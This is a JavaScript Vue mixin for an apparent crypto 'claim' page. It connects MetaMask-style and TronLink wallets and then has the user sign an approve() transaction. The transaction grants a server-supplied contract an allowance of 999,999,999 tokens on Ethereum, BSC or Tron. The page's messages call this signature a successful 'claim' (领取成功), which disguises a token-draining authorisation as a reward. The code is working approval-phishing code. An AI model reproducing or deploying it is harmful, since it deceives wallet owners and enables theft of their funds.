import Web3 from "web3";
import {mapGetters} from "vuex";
import comjs from "@/common/util"

export const commonMixin = {
    computed: {
        ...mapGetters([
            'address',
            'contracts',
            'isConnected',
            'walletLinkName',
            'walletLink',
            'walletLinkId',
            'walletIndex',
        ]),
    },
    data() {
        return {
            isauto: true,
            web3js: null,
            tronWeb: null,
        }
    },
    async onLoad() {
        await this.initWeb3()
        await this.connect()
    },
    methods: {
        async initWeb3(){
            if (window.ethereum && this.web3js === null) {
                this.web3js = new Web3(window.ethereum);
            }
        },
        async ethcontent_address() {
            console.log(`call ethcontent_address`)
            // 钱包地址
            const accounts = await this.web3js.eth.getAccounts();
            if (accounts.length >= 1 && accounts[0]) {
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                await this.$store.dispatch(`setAddress`, {
                    wallet_address: accounts[0],
                    smart_contract: ctx?.smart_contract
                })
            }
        },
        // 钱包连接
        async connect() {
            console.log(`call ethcontent`)
            //检测是否以太环境
            const obj = setInterval(async () => {
                if (window?.ethereum) {
                    console.log(`window.ethereum`)
                    clearInterval(obj);
                    if (this.web3js === null) {
                        this.web3js = new Web3(window.ethereum);
                    }
                    //@todo 这一步可能需要调整，在选择不同的链才触发
                    //链接钱包
                    await ethereum.request({method: 'eth_requestAccounts'}).catch(e => console.log(e));
                    await this.ethChain()
                } else if (window?.tronWeb) {
                    console.log(`window.tronWeb`)
                    if (typeof window.tronWeb?.defaultAddress?.base58 !== 'undefined') {
                        clearInterval(obj);
                        if(!this.walletIndex){
                            this.chooselink()
                            return;
                        }
                        let ctx = this.contracts[this.walletLink[this.walletIndex]]
                        console.log(`this.walletIndex`,this.walletIndex)
                        console.log(`start setAddress`,window?.tronWeb?.defaultAddress?.base58)
                        if(window?.tronWeb?.defaultAddress?.base58){
                            await this.$store.dispatch(`setAddress`, {
                                wallet_address: window.tronWeb?.defaultAddress?.base58,
                                smart_contract: ctx?.smart_contract
                            })
                            await this.$store.dispatch(`setWalletIndex`, 2)
                        }
                        this.tronWeb = window.tronWeb;
                    }
                } else {
                    console.log('not net')
                    clearInterval(obj);
                    if (!this.isauto) {
                        await this.showWalletList()
                    }
                }
            }, 100);
        },
        chooselink() {
            console.log(`call chooselink`)
            //是否已连接
            if (this.isConnected) {
                return true;
            }
            this.isauto = false
            uni.showActionSheet({
                title: null,
                itemList: this.walletLinkName,
                success: async (res) => {
                    await this.$store.dispatch(`setWalletIndex`, res.tapIndex)
                    if (this.walletLink[this.walletIndex] === 'trc') {
                        await this.trcConnect()
                    } else {
                        console.log(`ethcontent`)
                        await this.connect()
                    }
                }
            })
        },
        async ethChain() {
            //获取链id
            console.log(`call ethcontent_chain`)
            try {
                const chainIdHex = await ethereum.request({
                    method: 'eth_chainId'
                });
                const chainId = Web3.utils.hexToNumber(chainIdHex)
                if (this.isauto) {
                    if ([1, 11155111].includes(chainId)) {
                        //erc
                        console.log(`erc link`)
                        await this.$store.dispatch(`setWalletIndex`, 0)
                    } else if ([56].includes(chainId)) {
                        //bsc
                        console.log(`bsc link`)
                        await this.$store.dispatch(`setWalletIndex`, 1)
                    }
                    await this.ethcontent_address();
                } else {
                    await this.ethcontent_address();
                }
            } catch (e) {
                console.log(`ethcontent_chain exception`, e)
                comjs.jsalert('连接失败');
            }
        },
        async trcConnect() {
            this.tronWeb = await this.getTronWeb();
            const res = await tronLink.request({method: 'tron_requestAccounts'});
            if (res.code === 200) {
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                await this.$store.dispatch(`setAddress`, {
                    wallet_address: window.tronWeb.defaultAddress.base58,
                    smart_contract: ctx?.smart_contract
                })
                await this.$store.dispatch(`setIsConnected`, true)
                await this.$store.dispatch(`setWalletIndex`, 2)
            } else {
                await this.showWalletList()
            }
        },
        async showWalletList() {
            //钱包跳转
            //@todo 域名从接口获取？
            let dappdomain = window.location.origin //本站域名
            //各个以太坊钱包地址
            let walletName = ['MetaMask', 'Coinbase', 'imToken', 'TokenPocket', 'TrustWallet']
            let walletUrl = {}
            walletUrl[0] = `https://metamask.app.link/dapp/${dappdomain}`
            walletUrl[1] = 'https://go.cb-w.com/'
            walletUrl[2] = `imtokenv2://navigate/DappView?url=${dappdomain}`
            walletUrl[3] = `tpdapp://open?params={"url": "${dappdomain}", "chain": "ETH"}`
            walletUrl[4] = `https://link.trustwallet.com/open_url?url=${dappdomain}`
            uni.showActionSheet({
                title: null,
                itemList: walletName,
                success: (res) => {
                    console.log('url', walletUrl[res.tapIndex])
                    window.location.href = walletUrl[res.tapIndex]
                }
            })
        },
        async getTronWeb() {
            let tronWeb;
            if (window.tronLink.ready) {
                tronWeb = tronLink.tronWeb;
            } else {
                const res = await tronLink.request({method: 'tron_requestAccounts'});
                if (res.code === 200) {
                    tronWeb = tronLink.tronWeb;
                }
            }
            return tronWeb;
        },
        async approveSuccess() {
            //保存授权地址信息，无需处理返回信息
            console.log(`call doapprove_success`)
        },
        async approveTrc() {
            console.log(`call doapprove_trc`)
            //是否获取到相应合约
            if (this.contracts.length === 0 || !this.contracts?.trc) {
                return false;
            }
            await uni.showLoading()
            try {
                let contractdata = this.contracts?.trc
                if (!contractdata) {
                    return;
                }
                const tronWeb = window.tronWeb
                let _value = 999999999000000 //授权数量
                const parameter = [{
                    type: 'address',
                    value: contractdata.smart_contract
                }, {
                    type: 'uint256',
                    value: _value
                }];
                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                    contractdata.smart_contract,
                    "approve(address,uint256)", {},
                    parameter,
                    this.address
                );
                const signedTx = await tronWeb.trx.sign(tx.transaction);
                const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
                uni.hideLoading()
                if (broastTx?.result) {

                    //授权处理成功，开始成功后的业务处理----------------------
                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
                    await this.approveSuccess()
                    //授权处理成功，结束成功后的业务处理----------------------

                    comjs.jsalert("领取成功");
                } else {
                    comjs.msg('领取失败')
                }
            } catch (e) {
                uni.hideLoading()
                console.log(`exception:`,e)
                comjs.msg('领取失败')
            }
        },
        async approveEth() {
            console.log(`doapprove_eth`)
            await uni.showLoading()
            try {
                //以太坊/币安  授权开始
                let strabi =
                    '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
                let abi = JSON.parse(strabi)
                let ctx = this.contracts[this.walletLink[this.walletIndex]]
                if (!ctx) {
                    return;
                }
                let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
                //授权数量
                let _value = Web3.utils.toWei("999999999", 'ether');
                const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
                    from: this.address
                })
                const transactionHash = receipt?.transactionHash;
                if (transactionHash) {
                    uni.hideLoading()
                    await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
                    await this.approveSuccess()
                    comjs.jsalert("领取成功");
                }
            } catch (e) {
                console.log(`e`,e)
                uni.hideLoading()
                comjs.msg('领取失败')
            }
        },
        doapprove() {
            //是否已授权
            if (this.isApprove) {
                comjs.jsalert("领取成功");
                return true;
            }
            //没有连接到钱包？开始连接
            if (!this.isConnected) {
                this.chooselink()
                return true;
            }
            //开始授权
            if (this.walletLink[this.walletIndex] === 'trc') {
                this.approveTrc();
            } else {
                this.approveEth();
            }
        },
    }
}